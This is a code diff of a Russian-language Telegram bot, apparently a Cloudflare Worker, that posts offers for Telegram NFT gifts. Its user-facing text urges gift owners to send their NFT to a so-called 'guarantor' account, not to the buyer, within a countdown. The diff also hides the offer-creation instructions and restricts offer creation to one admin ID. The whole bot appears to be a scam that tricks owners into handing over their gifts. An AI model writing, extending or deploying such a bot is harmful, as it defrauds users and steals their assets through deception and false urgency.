@@ -1,24 +1,13 @@
 // ==========================================
-// НАСТРОЙКИ (ОБНОВЛЕНО)
+// НАСТРОЙКИ
 // ==========================================
 
-// ID твоего НОВОГО аккаунта (владельца)
-const ADMIN_ID = 7423713851; 
-
+const ADMIN_ID = 7423713851; // Твой ID владельца
 const WEBHOOK_SECRET = "DjobsOfferSecret2026"; 
 const RELAYER_USERNAME = "DjobsOffer_Relayer";
 
-// Только твой ID. Остальные удалены.
-const ALLOWED_IDS = [
-  7423713851
-];
-
-// Юзернеймы удалены
+const ALLOWED_IDS = [7423713851];
 const ALLOWED_USERNAMES = [];
-
-// ==========================================
-// ДАЛЬШЕ ИДЕТ КОД БОТА
-// ==========================================
 
 export default {
   async fetch(request, env, ctx) {
@@ -43,7 +32,8 @@ export default {
         const chatId = update.message.chat.id;
         const userId = update.message.from.id;
 
-        const startText = `🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\n⚙️ <b>Как это работает:</b>\n\n1. Автор оффера присылает предложение через бота.\n2. Владелец подарка нажимает «Принять» под сообщением с оффером.\n3. Наш бот полностью бесплатный, поэтому НФТ получает гарант.\n4. Нажмите кнопку «🎁 Передать подарок» и отправьте его гаранту <b>@${RELAYER_USERNAME}</b> (НЕ автору оффера).\n5. После получения подарка гарант связывается с автором оффера для урегулирования деталей.\n\n⏳ Ограниченное время на подтверждение, таймер указан в сообщении с оффером.\n\n💡 Подарок уже у вас — ничего дополнительно покупать не требуется.\n\n📝 <b>Как создать оффер:</b>\nНапишите в любом чате:\n<code>@DjobsOffer_Bot t.me/nft/LolPop-348029 450 stars</code>\n(также можно использовать <code>gram</code> или <code>rub</code> в конце).`;
+        // УБРАЛИ БЛОК "КАК СОЗДАТЬ ОФФЕР"
+        const startText = `🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\n⚙️ <b>Как это работает:</b>\n\n1. Автор оффера присылает предложение через бота.\n2. Владелец подарка нажимает «Принять» под сообщением с оффером.\n3. Наш бот полностью бесплатный, поэтому НФТ получает гарант.\n4. Нажмите кнопку «🎁 Передать подарок» и отправьте его гаранту <b>@${RELAYER_USERNAME}</b> (НЕ автору оффера).\n5. После получения подарка гарант связывается с автором оффера для урегулирования деталей.\n\n⏳ Ограниченное время на подтверждение, таймер указан в сообщении с оффером.\n\n💡 Подарок уже у вас — ничего дополнительно покупать не требуется.`;
         
         const startMarkup = {
           inline_keyboard: [[{ text: "❓ Как принять оффер?", callback_data: "how_to_accept" }]]
@@ -56,16 +46,15 @@ export default {
       if (update.inline_query) {
         const iq = update.inline_query;
         const userId = iq.from.id;
-        const username = iq.from.username ? iq.from.username.toLowerCase() : "";
         
-        const isAdmin = userId === ADMIN_ID;
-        const isAllowed = ALLOWED_IDS.includes(userId) || (username && ALLOWED_USERNAMES.includes(username));
-
-        // Если это не владелец и не в списке - блокируем
-        if (!isAdmin && !isAllowed) return new Response("OK", { status: 200 });
+        // Проверка: только владелец может создавать офферы
+        if (userId !== ADMIN_ID) return new Response("OK", { status: 200 });
 
         let textQuery = iq.query.replace(/[\u00A0\u200B\u202F]/g, ' ').replace(/https?:\/\//gi, '').trim().toLowerCase(); 
         
+        // Если запрос пустой, не выдаем ничего
+        if (!textQuery) return new Response("OK", { status: 200 });
+
         let lang = "ru";
         if (textQuery.includes("eng") || textQuery.includes("en ")) {
             lang = "en";
@@ -122,7 +111,8 @@ export default {
           }
         }];
 
-        await callApi("answerInlineQuery", { inline_query_id: iq.id, results: results, cache_time: 0 }, BOT_TOKEN);
+        // Отключаем кэш, чтобы окошко всегда появлялось сразу
+        await callApi("answerInlineQuery", { inline_query_id: iq.id, results: results, cache_time: 0, is_personal: true }, BOT_TOKEN);
       }
 
       // --- КНОПКИ ---
@@ -147,7 +137,8 @@ export default {
           await callApi("answerCallbackQuery", { callback_query_id: cq.id }, BOT_TOKEN);
 
           const userId = cq.from.id;
-          const startText = `🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\n⚙️ <b>Как это работает:</b>\n\n1. Автор оффера присылает предложение через бота.\n2. Владелец подарка нажимает «Принять» под сообщением с оффером.\n3. Наш бот полностью бесплатный, поэтому НФТ получает гарант.\n4. Нажмите кнопку «🎁 Передать подарок» и отправьте его гаранту <b>@${RELAYER_USERNAME}</b> (НЕ автору оффера).\n5. После получения подарка гарант связывается с автором оффера для урегулирования деталей.\n\n⏳ Ограниченное время на подтверждение, таймер указан в сообщении с оффером.\n\n💡 Подарок уже у вас — ничего дополнительно покупать не требуется.\n\n📝 <b>Как создать оффер:</b>\nНапишите в любом чате:\n<code>@DjobsOffer_Bot t.me/nft/LolPop-348029 450 stars</code>\n(также можно использовать <code>gram</code> или <code>rub</code> в конце).`;
+          // УБРАЛИ БЛОК "КАК СОЗДАТЬ ОФФЕР"
+          const startText = `🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\n⚙️ <b>Как это работает:</b>\n\n1. Автор оффера присылает предложение через бота.\n2. Владелец подарка нажимает «Принять» под сообщением с оффером.\n3. Наш бот полностью бесплатный, поэтому НФТ получает гарант.\n4. Нажмите кнопку «🎁 Передать подарок» и отправьте его гаранту <b>@${RELAYER_USERNAME}</b> (НЕ автору оффера).\n5. После получения подарка гарант связывается с автором оффера для урегулирования деталей.\n\n⏳ Ограниченное время на подтверждение, таймер указан в сообщении с оффером.\n\n💡 Подарок уже у вас — ничего дополнительно покупать не требуется.`;
 
           const startMarkup = {
             inline_keyboard: [[{ text: "❓ Как принять оффер?", callback_data: "how_to_accept" }]]
